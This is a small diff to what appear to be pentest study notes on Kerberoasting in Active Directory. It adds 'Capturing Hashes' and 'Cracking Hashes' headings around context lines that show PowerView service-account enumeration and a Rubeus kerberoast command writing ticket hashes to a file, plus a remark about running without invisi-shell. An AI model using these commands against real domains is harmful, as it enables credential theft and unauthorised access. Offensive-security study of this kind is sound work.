@@ -34,6 +34,8 @@ Get-DomainUser -SPN
 ![](https://i.imgur.com/S7sx0zM.png)
 
 
+**_Capturing Hashes :_**
+
 
 - Use Rubeus to list Kerberoast stats
 
@@ -67,6 +69,9 @@ Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
 
 > **Note -:** You don't need invisi-shell while running `rubeus` here, it won't be stable, also the options with **must run**, must be ran as one might provide an hash and the other might not, depending on system configuration
 
+
+
+**_Cracking Hashes :_**
 
 
 
